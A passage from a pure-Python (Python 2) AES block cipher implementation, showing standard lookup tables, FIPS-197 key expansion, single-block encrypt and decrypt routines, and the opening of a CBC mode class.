0xe49cd8b4, 0xc1906456, 0x84617bcb, 0xb670d532, 0x5c74486c, 0x5742d0b8 ]
    T8 = [ 0xf4a75051, 0x4165537e, 0x17a4c31a, 0x275e963a, 0xab6bcb3b, 0x9d45f11f, 0xfa58abac, 0xe303934b, 0x30fa5520, 0x766df6ad, 0xcc769188, 0x024c25f5, 0xe5d7fc4f, 0x2acbd7c5, 0x35448026, 0x62a38fb5, 0xb15a49de, 0xba1b6725, 0xea0e9845, 0xfec0e15d, 0x2f7502c3, 0x4cf01281, 0x4697a38d, 0xd3f9c66b, 0x8f5fe703, 0x929c9515, 0x6d7aebbf, 0x5259da95, 0xbe832dd4, 0x7421d358, 0xe0692949, 0xc9c8448e, 0xc2896a75, 0x8e7978f4, 0x583e6b99, 0xb971dd27, 0xe14fb6be, 0x88ad17f0, 0x20ac66c9, 0xce3ab47d, 0xdf4a1863, 0x1a3182e5, 0x51336097, 0x537f4562, 0x6477e0b1, 0x6bae84bb, 0x81a01cfe, 0x082b94f9, 0x48685870, 0x45fd198f, 0xde6c8794, 0x7bf8b752, 0x73d323ab, 0x4b02e272, 0x1f8f57e3, 0x55ab2a66, 0xeb2807b2, 0xb5c2032f, 0xc57b9a86, 0x3708a5d3, 0x2887f230, 0xbfa5b223, 0x036aba02, 0x16825ced, 0xcf1c2b8a, 0x79b492a7, 0x07f2f0f3, 0x69e2a14e, 0xdaf4cd65, 0x05bed506, 0x34621fd1, 0xa6fe8ac4, 0x2e539d34, 0xf355a0a2, 0x8ae13205, 0xf6eb75a4, 0x83ec390b, 0x60efaa40, 0x719f065e, 0x6e1051bd, 0x218af93e, 0xdd063d96, 0x3e05aedd, 0xe6bd464d, 0x548db591, 0xc45d0571, 0x06d46f04, 0x5015ff60, 0x98fb2419, 0xbde997d6, 0x4043cc89, 0xd99e7767, 0xe842bdb0, 0x898b8807, 0x195b38e7, 0xc8eedb79, 0x7c0a47a1, 0x420fe97c, 0x841ec9f8, 0x00000000, 0x80868309, 0x2bed4832, 0x1170ac1e, 0x5a724e6c, 0x0efffbfd, 0x8538560f, 0xaed51e3d, 0x2d392736, 0x0fd9640a, 0x5ca62168, 0x5b54d19b, 0x362e3a24, 0x0a67b10c, 0x57e70f93, 0xee96d2b4, 0x9b919e1b, 0xc0c54f80, 0xdc20a261, 0x774b695a, 0x121a161c, 0x93ba0ae2, 0xa02ae5c0, 0x22e0433c, 0x1b171d12, 0x090d0b0e, 0x8bc7adf2, 0xb6a8b92d, 0x1ea9c814, 0xf1198557, 0x75074caf, 0x99ddbbee, 0x7f60fda3, 0x01269ff7, 0x72f5bc5c, 0x663bc544, 0xfb7e345b, 0x4329768b, 0x23c6dccb, 0xedfc68b6, 0xe4f163b8, 0x31dccad7, 0x63851042, 0x97224013, 0xc6112084, 0x4a247d85, 0xbb3df8d2, 0xf93211ae, 0x29a16dc7, 0x9e2f4b1d, 0xb230f3dc, 0x8652ec0d, 0xc1e3d077, 0xb3166c2b, 0x70b999a9, 0x9448fa11, 0xe9642247, 0xfc8cc4a8, 0xf03f1aa0, 0x7d2cd856, 0x3390ef22, 0x494ec787, 0x38d1c1d9, 0xcaa2fe8c, 0xd40b3698, 0xf581cfa6, 0x7ade28a5, 0xb78e26da, 0xadbfa43f, 0x3a9de42c, 0x78920d50, 0x5fcc9b6a, 0x7e466254, 0x8d13c2f6, 0xd8b8e890, 0x39f75e2e, 0xc3aff582, 0x5d80be9f, 0xd0937c69, 0xd52da96f, 0x2512b3cf, 0xac993bc8, 0x187da710, 0x9c636ee8, 0x3bbb7bdb, 0x267809cd, 0x5918f46e, 0x9ab701ec, 0x4f9aa883, 0x956e65e6, 0xffe67eaa, 0xbccf0821, 0x15e8e6ef, 0xe79bd9ba, 0x6f36ce4a, 0x9f09d4ea, 0xb07cd629, 0xa4b2af31, 0x3f23312a, 0xa59430c6, 0xa266c035, 0x4ebc3774, 0x82caa6fc, 0x90d0b0e0, 0xa7d81533, 0x04984af1, 0xecdaf741, 0xcd500e7f, 0x91f62f17, 0x4dd68d76, 0xefb04d43, 0xaa4d54cc, 0x9604dfe4, 0xd1b5e39e, 0x6a881b4c, 0x2c1fb8c1, 0x65517f46, 0x5eea049d, 0x8c355d01, 0x877473fa, 0x0b412efb, 0x671d5ab3, 0xdbd25292, 0x105633e9, 0xd647136d, 0xd7618c9a, 0xa10c7a37, 0xf8148e59, 0x133c89eb, 0xa927eece, 0x61c935b7, 0x1ce5ede1, 0x47b13c7a, 0xd2df599c, 0xf2733f55, 0x14ce7918, 0xc737bf73, 0xf7cdea53, 0xfdaa5b5f, 0x3d6f14df, 0x44db8678, 0xaff381ca, 0x68c43eb9, 0x24342c38, 0xa3405fc2, 0x1dc37216, 0xe2250cbc, 0x3c498b28, 0x0d9541ff, 0xa8017139, 0x0cb3de08, 0xb4e49cd8, 0x56c19064, 0xcb84617b, 0x32b670d5, 0x6c5c7448, 0xb85742d0 ]

    # Transformations for decryption key expansion
    U1 = [ 0x00000000, 0x0e090d0b, 0x1c121a16, 0x121b171d, 0x3824342c, 0x362d3927, 0x24362e3a, 0x2a3f2331, 0x70486858, 0x7e416553, 0x6c5a724e, 0x62537f45, 0x486c5c74, 0x4665517f, 0x547e4662, 0x5a774b69, 0xe090d0b0, 0xee99ddbb, 0xfc82caa6, 0xf28bc7ad, 0xd8b4e49c, 0xd6bde997, 0xc4a6fe8a, 0xcaaff381, 0x90d8b8e8, 0x9ed1b5e3, 0x8ccaa2fe, 0x82c3aff5, 0xa8fc8cc4, 0xa6f581cf, 0xb4ee96d2, 0xbae79bd9, 0xdb3bbb7b, 0xd532b670, 0xc729a16d, 0xc920ac66, 0xe31f8f57, 0xed16825c, 0xff0d9541, 0xf104984a, 0xab73d323, 0xa57ade28, 0xb761c935, 0xb968c43e, 0x9357e70f, 0x9d5eea04, 0x8f45fd19, 0x814cf012, 0x3bab6bcb, 0x35a266c0, 0x27b971dd, 0x29b07cd6, 0x038f5fe7, 0x0d8652ec, 0x1f9d45f1, 0x119448fa, 0x4be30393, 0x45ea0e98, 0x57f11985, 0x59f8148e, 0x73c737bf, 0x7dce3ab4, 0x6fd52da9, 0x61dc20a2, 0xad766df6, 0xa37f60fd, 0xb16477e0, 0xbf6d7aeb, 0x955259da, 0x9b5b54d1, 0x894043cc, 0x87494ec7, 0xdd3e05ae, 0xd33708a5, 0xc12c1fb8, 0xcf2512b3, 0xe51a3182, 0xeb133c89, 0xf9082b94, 0xf701269f, 0x4de6bd46, 0x43efb04d, 0x51f4a750, 0x5ffdaa5b, 0x75c2896a, 0x7bcb8461, 0x69d0937c, 0x67d99e77, 0x3daed51e, 0x33a7d815, 0x21bccf08, 0x2fb5c203, 0x058ae132, 0x0b83ec39, 0x1998fb24, 0x1791f62f, 0x764dd68d, 0x7844db86, 0x6a5fcc9b, 0x6456c190, 0x4e69e2a1, 0x4060efaa, 0x527bf8b7, 0x5c72f5bc, 0x0605bed5, 0x080cb3de, 0x1a17a4c3, 0x141ea9c8, 0x3e218af9, 0x302887f2, 0x223390ef, 0x2c3a9de4, 0x96dd063d, 0x98d40b36, 0x8acf1c2b, 0x84c61120, 0xaef93211, 0xa0f03f1a, 0xb2eb2807, 0xbce2250c, 0xe6956e65, 0xe89c636e, 0xfa877473, 0xf48e7978, 0xdeb15a49, 0xd0b85742, 0xc2a3405f, 0xccaa4d54, 0x41ecdaf7, 0x4fe5d7fc, 0x5dfec0e1, 0x53f7cdea, 0x79c8eedb, 0x77c1e3d0, 0x65daf4cd, 0x6bd3f9c6, 0x31a4b2af, 0x3fadbfa4, 0x2db6a8b9, 0x23bfa5b2, 0x09808683, 0x07898b88, 0x15929c95, 0x1b9b919e, 0xa17c0a47, 0xaf75074c, 0xbd6e1051, 0xb3671d5a, 0x99583e6b, 0x97513360, 0x854a247d, 0x8b432976, 0xd134621f, 0xdf3d6f14, 0xcd267809, 0xc32f7502, 0xe9105633, 0xe7195b38, 0xf5024c25, 0xfb0b412e, 0x9ad7618c, 0x94de6c87, 0x86c57b9a, 0x88cc7691, 0xa2f355a0, 0xacfa58ab, 0xbee14fb6, 0xb0e842bd, 0xea9f09d4, 0xe49604df, 0xf68d13c2, 0xf8841ec9, 0xd2bb3df8, 0xdcb230f3, 0xcea927ee, 0xc0a02ae5, 0x7a47b13c, 0x744ebc37, 0x6655ab2a, 0x685ca621, 0x42638510, 0x4c6a881b, 0x5e719f06, 0x5078920d, 0x0a0fd964, 0x0406d46f, 0x161dc372, 0x1814ce79, 0x322bed48, 0x3c22e043, 0x2e39f75e, 0x2030fa55, 0xec9ab701, 0xe293ba0a, 0xf088ad17, 0xfe81a01c, 0xd4be832d, 0xdab78e26, 0xc8ac993b, 0xc6a59430, 0x9cd2df59, 0x92dbd252, 0x80c0c54f, 0x8ec9c844, 0xa4f6eb75, 0xaaffe67e, 0xb8e4f163, 0xb6edfc68, 0x0c0a67b1, 0x02036aba, 0x10187da7, 0x1e1170ac, 0x342e539d, 0x3a275e96, 0x283c498b, 0x26354480, 0x7c420fe9, 0x724b02e2, 0x605015ff, 0x6e5918f4, 0x44663bc5, 0x4a6f36ce, 0x587421d3, 0x567d2cd8, 0x37a10c7a, 0x39a80171, 0x2bb3166c, 0x25ba1b67, 0x0f853856, 0x018c355d, 0x13972240, 0x1d9e2f4b, 0x47e96422, 0x49e06929, 0x5bfb7e34, 0x55f2733f, 0x7fcd500e, 0x71c45d05, 0x63df4a18, 0x6dd64713, 0xd731dcca, 0xd938d1c1, 0xcb23c6dc, 0xc52acbd7, 0xef15e8e6, 0xe11ce5ed, 0xf307f2f0, 0xfd0efffb, 0xa779b492, 0xa970b999, 0xbb6bae84, 0xb562a38f, 0x9f5d80be, 0x91548db5, 0x834f9aa8, 0x8d4697a3 ]
    U2 = [ 0x00000000, 0x0b0e090d, 0x161c121a, 0x1d121b17, 0x2c382434, 0x27362d39, 0x3a24362e, 0x312a3f23, 0x58704868, 0x537e4165, 0x4e6c5a72, 0x4562537f, 0x74486c5c, 0x7f466551, 0x62547e46, 0x695a774b, 0xb0e090d0, 0xbbee99dd, 0xa6fc82ca, 0xadf28bc7, 0x9cd8b4e4, 0x97d6bde9, 0x8ac4a6fe, 0x81caaff3, 0xe890d8b8, 0xe39ed1b5, 0xfe8ccaa2, 0xf582c3af, 0xc4a8fc8c, 0xcfa6f581, 0xd2b4ee96, 0xd9bae79b, 0x7bdb3bbb, 0x70d532b6, 0x6dc729a1, 0x66c920ac, 0x57e31f8f, 0x5ced1682, 0x41ff0d95, 0x4af10498, 0x23ab73d3, 0x28a57ade, 0x35b761c9, 0x3eb968c4, 0x0f9357e7, 0x049d5eea, 0x198f45fd, 0x12814cf0, 0xcb3bab6b, 0xc035a266, 0xdd27b971, 0xd629b07c, 0xe7038f5f, 0xec0d8652, 0xf11f9d45, 0xfa119448, 0x934be303, 0x9845ea0e, 0x8557f119, 0x8e59f814, 0xbf73c737, 0xb47dce3a, 0xa96fd52d, 0xa261dc20, 0xf6ad766d, 0xfda37f60, 0xe0b16477, 0xebbf6d7a, 0xda955259, 0xd19b5b54, 0xcc894043, 0xc787494e, 0xaedd3e05, 0xa5d33708, 0xb8c12c1f, 0xb3cf2512, 0x82e51a31, 0x89eb133c, 0x94f9082b, 0x9ff70126, 0x464de6bd, 0x4d43efb0, 0x5051f4a7, 0x5b5ffdaa, 0x6a75c289, 0x617bcb84, 0x7c69d093, 0x7767d99e, 0x1e3daed5, 0x1533a7d8, 0x0821bccf, 0x032fb5c2, 0x32058ae1, 0x390b83ec, 0x241998fb, 0x2f1791f6, 0x8d764dd6, 0x867844db, 0x9b6a5fcc, 0x906456c1, 0xa14e69e2, 0xaa4060ef, 0xb7527bf8, 0xbc5c72f5, 0xd50605be, 0xde080cb3, 0xc31a17a4, 0xc8141ea9, 0xf93e218a, 0xf2302887, 0xef223390, 0xe42c3a9d, 0x3d96dd06, 0x3698d40b, 0x2b8acf1c, 0x2084c611, 0x11aef932, 0x1aa0f03f, 0x07b2eb28, 0x0cbce225, 0x65e6956e, 0x6ee89c63, 0x73fa8774, 0x78f48e79, 0x49deb15a, 0x42d0b857, 0x5fc2a340, 0x54ccaa4d, 0xf741ecda, 0xfc4fe5d7, 0xe15dfec0, 0xea53f7cd, 0xdb79c8ee, 0xd077c1e3, 0xcd65daf4, 0xc66bd3f9, 0xaf31a4b2, 0xa43fadbf, 0xb92db6a8, 0xb223bfa5, 0x83098086, 0x8807898b, 0x9515929c, 0x9e1b9b91, 0x47a17c0a, 0x4caf7507, 0x51bd6e10, 0x5ab3671d, 0x6b99583e, 0x60975133, 0x7d854a24, 0x768b4329, 0x1fd13462, 0x14df3d6f, 0x09cd2678, 0x02c32f75, 0x33e91056, 0x38e7195b, 0x25f5024c, 0x2efb0b41, 0x8c9ad761, 0x8794de6c, 0x9a86c57b, 0x9188cc76, 0xa0a2f355, 0xabacfa58, 0xb6bee14f, 0xbdb0e842, 0xd4ea9f09, 0xdfe49604, 0xc2f68d13, 0xc9f8841e, 0xf8d2bb3d, 0xf3dcb230, 0xeecea927, 0xe5c0a02a, 0x3c7a47b1, 0x37744ebc, 0x2a6655ab, 0x21685ca6, 0x10426385, 0x1b4c6a88, 0x065e719f, 0x0d507892, 0x640a0fd9, 0x6f0406d4, 0x72161dc3, 0x791814ce, 0x48322bed, 0x433c22e0, 0x5e2e39f7, 0x552030fa, 0x01ec9ab7, 0x0ae293ba, 0x17f088ad, 0x1cfe81a0, 0x2dd4be83, 0x26dab78e, 0x3bc8ac99, 0x30c6a594, 0x599cd2df, 0x5292dbd2, 0x4f80c0c5, 0x448ec9c8, 0x75a4f6eb, 0x7eaaffe6, 0x63b8e4f1, 0x68b6edfc, 0xb10c0a67, 0xba02036a, 0xa710187d, 0xac1e1170, 0x9d342e53, 0x963a275e, 0x8b283c49, 0x80263544, 0xe97c420f, 0xe2724b02, 0xff605015, 0xf46e5918, 0xc544663b, 0xce4a6f36, 0xd3587421, 0xd8567d2c, 0x7a37a10c, 0x7139a801, 0x6c2bb316, 0x6725ba1b, 0x560f8538, 0x5d018c35, 0x40139722, 0x4b1d9e2f, 0x2247e964, 0x2949e069, 0x345bfb7e, 0x3f55f273, 0x0e7fcd50, 0x0571c45d, 0x1863df4a, 0x136dd647, 0xcad731dc, 0xc1d938d1, 0xdccb23c6, 0xd7c52acb, 0xe6ef15e8, 0xede11ce5, 0xf0f307f2, 0xfbfd0eff, 0x92a779b4, 0x99a970b9, 0x84bb6bae, 0x8fb562a3, 0xbe9f5d80, 0xb591548d, 0xa8834f9a, 0xa38d4697 ]
    U3 = [ 0x00000000, 0x0d0b0e09, 0x1a161c12, 0x171d121b, 0x342c3824, 0x3927362d, 0x2e3a2436, 0x23312a3f, 0x68587048, 0x65537e41, 0x724e6c5a, 0x7f456253, 0x5c74486c, 0x517f4665, 0x4662547e, 0x4b695a77, 0xd0b0e090, 0xddbbee99, 0xcaa6fc82, 0xc7adf28b, 0xe49cd8b4, 0xe997d6bd, 0xfe8ac4a6, 0xf381caaf, 0xb8e890d8, 0xb5e39ed1, 0xa2fe8cca, 0xaff582c3, 0x8cc4a8fc, 0x81cfa6f5, 0x96d2b4ee, 0x9bd9bae7, 0xbb7bdb3b, 0xb670d532, 0xa16dc729, 0xac66c920, 0x8f57e31f, 0x825ced16, 0x9541ff0d, 0x984af104, 0xd323ab73, 0xde28a57a, 0xc935b761, 0xc43eb968, 0xe70f9357, 0xea049d5e, 0xfd198f45, 0xf012814c, 0x6bcb3bab, 0x66c035a2, 0x71dd27b9, 0x7cd629b0, 0x5fe7038f, 0x52ec0d86, 0x45f11f9d, 0x48fa1194, 0x03934be3, 0x0e9845ea, 0x198557f1, 0x148e59f8, 0x37bf73c7, 0x3ab47dce, 0x2da96fd5, 0x20a261dc, 0x6df6ad76, 0x60fda37f, 0x77e0b164, 0x7aebbf6d, 0x59da9552, 0x54d19b5b, 0x43cc8940, 0x4ec78749, 0x05aedd3e, 0x08a5d337, 0x1fb8c12c, 0x12b3cf25, 0x3182e51a, 0x3c89eb13, 0x2b94f908, 0x269ff701, 0xbd464de6, 0xb04d43ef, 0xa75051f4, 0xaa5b5ffd, 0x896a75c2, 0x84617bcb, 0x937c69d0, 0x9e7767d9, 0xd51e3dae, 0xd81533a7, 0xcf0821bc, 0xc2032fb5, 0xe132058a, 0xec390b83, 0xfb241998, 0xf62f1791, 0xd68d764d, 0xdb867844, 0xcc9b6a5f, 0xc1906456, 0xe2a14e69, 0xefaa4060, 0xf8b7527b, 0xf5bc5c72, 0xbed50605, 0xb3de080c, 0xa4c31a17, 0xa9c8141e, 0x8af93e21, 0x87f23028, 0x90ef2233, 0x9de42c3a, 0x063d96dd, 0x0b3698d4, 0x1c2b8acf, 0x112084c6, 0x3211aef9, 0x3f1aa0f0, 0x2807b2eb, 0x250cbce2, 0x6e65e695, 0x636ee89c, 0x7473fa87, 0x7978f48e, 0x5a49deb1, 0x5742d0b8, 0x405fc2a3, 0x4d54ccaa, 0xdaf741ec, 0xd7fc4fe5, 0xc0e15dfe, 0xcdea53f7, 0xeedb79c8, 0xe3d077c1, 0xf4cd65da, 0xf9c66bd3, 0xb2af31a4, 0xbfa43fad, 0xa8b92db6, 0xa5b223bf, 0x86830980, 0x8b880789, 0x9c951592, 0x919e1b9b, 0x0a47a17c, 0x074caf75, 0x1051bd6e, 0x1d5ab367, 0x3e6b9958, 0x33609751, 0x247d854a, 0x29768b43, 0x621fd134, 0x6f14df3d, 0x7809cd26, 0x7502c32f, 0x5633e910, 0x5b38e719, 0x4c25f502, 0x412efb0b, 0x618c9ad7, 0x6c8794de, 0x7b9a86c5, 0x769188cc, 0x55a0a2f3, 0x58abacfa, 0x4fb6bee1, 0x42bdb0e8, 0x09d4ea9f, 0x04dfe496, 0x13c2f68d, 0x1ec9f884, 0x3df8d2bb, 0x30f3dcb2, 0x27eecea9, 0x2ae5c0a0, 0xb13c7a47, 0xbc37744e, 0xab2a6655, 0xa621685c, 0x85104263, 0x881b4c6a, 0x9f065e71, 0x920d5078, 0xd9640a0f, 0xd46f0406, 0xc372161d, 0xce791814, 0xed48322b, 0xe0433c22, 0xf75e2e39, 0xfa552030, 0xb701ec9a, 0xba0ae293, 0xad17f088, 0xa01cfe81, 0x832dd4be, 0x8e26dab7, 0x993bc8ac, 0x9430c6a5, 0xdf599cd2, 0xd25292db, 0xc54f80c0, 0xc8448ec9, 0xeb75a4f6, 0xe67eaaff, 0xf163b8e4, 0xfc68b6ed, 0x67b10c0a, 0x6aba0203, 0x7da71018, 0x70ac1e11, 0x539d342e, 0x5e963a27, 0x498b283c, 0x44802635, 0x0fe97c42, 0x02e2724b, 0x15ff6050, 0x18f46e59, 0x3bc54466, 0x36ce4a6f, 0x21d35874, 0x2cd8567d, 0x0c7a37a1, 0x017139a8, 0x166c2bb3, 0x1b6725ba, 0x38560f85, 0x355d018c, 0x22401397, 0x2f4b1d9e, 0x642247e9, 0x692949e0, 0x7e345bfb, 0x733f55f2, 0x500e7fcd, 0x5d0571c4, 0x4a1863df, 0x47136dd6, 0xdccad731, 0xd1c1d938, 0xc6dccb23, 0xcbd7c52a, 0xe8e6ef15, 0xe5ede11c, 0xf2f0f307, 0xfffbfd0e, 0xb492a779, 0xb999a970, 0xae84bb6b, 0xa38fb562, 0x80be9f5d, 0x8db59154, 0x9aa8834f, 0x97a38d46 ]
    U4 = [ 0x00000000, 0x090d0b0e, 0x121a161c, 0x1b171d12, 0x24342c38, 0x2d392736, 0x362e3a24, 0x3f23312a, 0x48685870, 0x4165537e, 0x5a724e6c, 0x537f4562, 0x6c5c7448, 0x65517f46, 0x7e466254, 0x774b695a, 0x90d0b0e0, 0x99ddbbee, 0x82caa6fc, 0x8bc7adf2, 0xb4e49cd8, 0xbde997d6, 0xa6fe8ac4, 0xaff381ca, 0xd8b8e890, 0xd1b5e39e, 0xcaa2fe8c, 0xc3aff582, 0xfc8cc4a8, 0xf581cfa6, 0xee96d2b4, 0xe79bd9ba, 0x3bbb7bdb, 0x32b670d5, 0x29a16dc7, 0x20ac66c9, 0x1f8f57e3, 0x16825ced, 0x0d9541ff, 0x04984af1, 0x73d323ab, 0x7ade28a5, 0x61c935b7, 0x68c43eb9, 0x57e70f93, 0x5eea049d, 0x45fd198f, 0x4cf01281, 0xab6bcb3b, 0xa266c035, 0xb971dd27, 0xb07cd629, 0x8f5fe703, 0x8652ec0d, 0x9d45f11f, 0x9448fa11, 0xe303934b, 0xea0e9845, 0xf1198557, 0xf8148e59, 0xc737bf73, 0xce3ab47d, 0xd52da96f, 0xdc20a261, 0x766df6ad, 0x7f60fda3, 0x6477e0b1, 0x6d7aebbf, 0x5259da95, 0x5b54d19b, 0x4043cc89, 0x494ec787, 0x3e05aedd, 0x3708a5d3, 0x2c1fb8c1, 0x2512b3cf, 0x1a3182e5, 0x133c89eb, 0x082b94f9, 0x01269ff7, 0xe6bd464d, 0xefb04d43, 0xf4a75051, 0xfdaa5b5f, 0xc2896a75, 0xcb84617b, 0xd0937c69, 0xd99e7767, 0xaed51e3d, 0xa7d81533, 0xbccf0821, 0xb5c2032f, 0x8ae13205, 0x83ec390b, 0x98fb2419, 0x91f62f17, 0x4dd68d76, 0x44db8678, 0x5fcc9b6a, 0x56c19064, 0x69e2a14e, 0x60efaa40, 0x7bf8b752, 0x72f5bc5c, 0x05bed506, 0x0cb3de08, 0x17a4c31a, 0x1ea9c814, 0x218af93e, 0x2887f230, 0x3390ef22, 0x3a9de42c, 0xdd063d96, 0xd40b3698, 0xcf1c2b8a, 0xc6112084, 0xf93211ae, 0xf03f1aa0, 0xeb2807b2, 0xe2250cbc, 0x956e65e6, 0x9c636ee8, 0x877473fa, 0x8e7978f4, 0xb15a49de, 0xb85742d0, 0xa3405fc2, 0xaa4d54cc, 0xecdaf741, 0xe5d7fc4f, 0xfec0e15d, 0xf7cdea53, 0xc8eedb79, 0xc1e3d077, 0xdaf4cd65, 0xd3f9c66b, 0xa4b2af31, 0xadbfa43f, 0xb6a8b92d, 0xbfa5b223, 0x80868309, 0x898b8807, 0x929c9515, 0x9b919e1b, 0x7c0a47a1, 0x75074caf, 0x6e1051bd, 0x671d5ab3, 0x583e6b99, 0x51336097, 0x4a247d85, 0x4329768b, 0x34621fd1, 0x3d6f14df, 0x267809cd, 0x2f7502c3, 0x105633e9, 0x195b38e7, 0x024c25f5, 0x0b412efb, 0xd7618c9a, 0xde6c8794, 0xc57b9a86, 0xcc769188, 0xf355a0a2, 0xfa58abac, 0xe14fb6be, 0xe842bdb0, 0x9f09d4ea, 0x9604dfe4, 0x8d13c2f6, 0x841ec9f8, 0xbb3df8d2, 0xb230f3dc, 0xa927eece, 0xa02ae5c0, 0x47b13c7a, 0x4ebc3774, 0x55ab2a66, 0x5ca62168, 0x63851042, 0x6a881b4c, 0x719f065e, 0x78920d50, 0x0fd9640a, 0x06d46f04, 0x1dc37216, 0x14ce7918, 0x2bed4832, 0x22e0433c, 0x39f75e2e, 0x30fa5520, 0x9ab701ec, 0x93ba0ae2, 0x88ad17f0, 0x81a01cfe, 0xbe832dd4, 0xb78e26da, 0xac993bc8, 0xa59430c6, 0xd2df599c, 0xdbd25292, 0xc0c54f80, 0xc9c8448e, 0xf6eb75a4, 0xffe67eaa, 0xe4f163b8, 0xedfc68b6, 0x0a67b10c, 0x036aba02, 0x187da710, 0x1170ac1e, 0x2e539d34, 0x275e963a, 0x3c498b28, 0x35448026, 0x420fe97c, 0x4b02e272, 0x5015ff60, 0x5918f46e, 0x663bc544, 0x6f36ce4a, 0x7421d358, 0x7d2cd856, 0xa10c7a37, 0xa8017139, 0xb3166c2b, 0xba1b6725, 0x8538560f, 0x8c355d01, 0x97224013, 0x9e2f4b1d, 0xe9642247, 0xe0692949, 0xfb7e345b, 0xf2733f55, 0xcd500e7f, 0xc45d0571, 0xdf4a1863, 0xd647136d, 0x31dccad7, 0x38d1c1d9, 0x23c6dccb, 0x2acbd7c5, 0x15e8e6ef, 0x1ce5ede1, 0x07f2f0f3, 0x0efffbfd, 0x79b492a7, 0x70b999a9, 0x6bae84bb, 0x62a38fb5, 0x5d80be9f, 0x548db591, 0x4f9aa883, 0x4697a38d ]

    def __init__(self, key):

        if len(key) not in (16, 24, 32):
            raise ValueError('Invalid key size')

        rounds = self.number_of_rounds[len(key)]

        # Encryption round keys
        self._Ke = [[0] * 4 for i in xrange(rounds + 1)]

        # Decryption round keys
        self._Kd = [[0] * 4 for i in xrange(rounds + 1)]

        round_key_count = (rounds + 1) * 4
        KC = len(key) // 4

        # Convert the key into ints
        tk = [ struct.unpack('>i', key[i:i + 4])[0] for i in xrange(0, len(key), 4) ]

        # Copy values into round key arrays
        for i in xrange(0, KC):
            self._Ke[i // 4][i % 4] = tk[i]
            self._Kd[rounds - (i // 4)][i % 4] = tk[i]

        # Key expansion (fips-197 section 5.2)
        rconpointer = 0
        t = KC
        while t < round_key_count:

            tt = tk[KC - 1]
            tk[0] ^= ((self.S[(tt >> 16) & 0xFF] << 24) ^
                      (self.S[(tt >>  8) & 0xFF] << 16) ^
                      (self.S[ tt        & 0xFF] <<  8) ^
                       self.S[(tt >> 24) & 0xFF]        ^
                      (self.rcon[rconpointer] << 24))
            rconpointer += 1

            if KC != 8:
                for i in xrange(1, KC):
                    tk[i] ^= tk[i - 1]

            # Key expansion for 256-bit keys is "slightly different" (fips-197)
            else:
                for i in xrange(1, KC // 2):
                    tk[i] ^= tk[i - 1]
                tt = tk[KC // 2 - 1]

                tk[KC // 2] ^= (self.S[ tt        & 0xFF]        ^
                               (self.S[(tt >>  8) & 0xFF] <<  8) ^
                               (self.S[(tt >> 16) & 0xFF] << 16) ^
                               (self.S[(tt >> 24) & 0xFF] << 24))

                for i in xrange(KC // 2 + 1, KC):
                    tk[i] ^= tk[i - 1]

            # Copy values into round key arrays
            j = 0
            while j < KC and t < round_key_count:
                self._Ke[t // 4][t % 4] = tk[j]
                self._Kd[rounds - (t // 4)][t % 4] = tk[j]
                j += 1
                t += 1

        # Inverse-Cipher-ify the decryption round key (fips-197 section 5.3)
        for r in xrange(1, rounds):
            for j in xrange(0, 4):
                tt = self._Kd[r][j]
                self._Kd[r][j] = (self.U1[(tt >> 24) & 0xFF] ^
                                  self.U2[(tt >> 16) & 0xFF] ^
                                  self.U3[(tt >>  8) & 0xFF] ^
                                  self.U4[ tt        & 0xFF])

    def encrypt(self, plaintext):
        """
        Encrypt a block of plain text using the AES block cipher

        `Required`
        :param str plaintext:       16 byte block of plaintext

        """
        if len(plaintext) != 16:
            raise ValueError('wrong block length')

        rounds = len(self._Ke) - 1
        (s1, s2, s3) = [1, 2, 3]
        a = [0, 0, 0, 0]

        # Convert plaintext to (ints ^ key)
        t = [(_compact_word(plaintext[4 * i:4 * i + 4]) ^ self._Ke[0][i]) for i in xrange(0, 4)]

        # Apply round transforms
        for r in xrange(1, rounds):
            for i in xrange(0, 4):
                a[i] = (self.T1[(t[ i          ] >> 24) & 0xFF] ^
                        self.T2[(t[(i + s1) % 4] >> 16) & 0xFF] ^
                        self.T3[(t[(i + s2) % 4] >>  8) & 0xFF] ^
                        self.T4[ t[(i + s3) % 4]        & 0xFF] ^
                        self._Ke[r][i])
            t = copy.copy(a)

        # The last round is special
        result = [ ]
        for i in xrange(0, 4):
            tt = self._Ke[rounds][i]
            result.append((self.S[(t[ i          ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((self.S[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((self.S[(t[(i + s2) % 4] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
            result.append((self.S[ t[(i + s3) % 4]        & 0xFF] ^  tt       ) & 0xFF)

        return result

    def decrypt(self, ciphertext):
        """
        Decrypt a block of ciphertext using the AES block cipher

        `Required`
        :param str ciphertext:       16 byte block of ciphertext

        """
        if len(ciphertext) != 16:
            raise ValueError('wrong block length')

        rounds = len(self._Kd) - 1
        (s1, s2, s3) = [3, 2, 1]
        a = [0, 0, 0, 0]

        # Convert ciphertext to (ints ^ key)
        t = [(_compact_word(ciphertext[4 * i:4 * i + 4]) ^ self._Kd[0][i]) for i in xrange(0, 4)]

        # Apply round transforms
        for r in xrange(1, rounds):
            for i in xrange(0, 4):
                a[i] = (self.T5[(t[ i          ] >> 24) & 0xFF] ^
                        self.T6[(t[(i + s1) % 4] >> 16) & 0xFF] ^
                        self.T7[(t[(i + s2) % 4] >>  8) & 0xFF] ^
                        self.T8[ t[(i + s3) % 4]        & 0xFF] ^
                        self._Kd[r][i])
            t = copy.copy(a)

        # The last round is special
        result = [ ]
        for i in xrange(0, 4):
            tt = self._Kd[rounds][i]
            result.append((self.Si[(t[ i          ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((self.Si[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((self.Si[(t[(i + s2) % 4] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
            result.append((self.Si[ t[(i + s3) % 4]        & 0xFF] ^  tt       ) & 0xFF)

        return result


class AESModeOfOperationCBC(AES):
    """
    AES Cipher Block Chaining Mode

    `Required`
    :param str key:     16 byte shared secret key
    :param str iv:      16 byte initialization vector

    """

    name = "Cipher-Block Chaining (CBC)"
    block_size = 16

    def __init__(self, key, iv = None):
        if iv is None:
            self._last_cipherblock = [ 0 ] * 16
        elif len(iv) != 16:
            raise ValueError('initialization vector must be 16 bytes')
        else:
            self._last_cipherblock = _string_to_bytes(iv)

        self._aes = AES(key)

    def encrypt(self, plaintext):
        if len(plaintext) != 16:
            raise ValueError('plaintext block must be 16 bytes')

        plaintext = _string_to_bytes(plaintext)
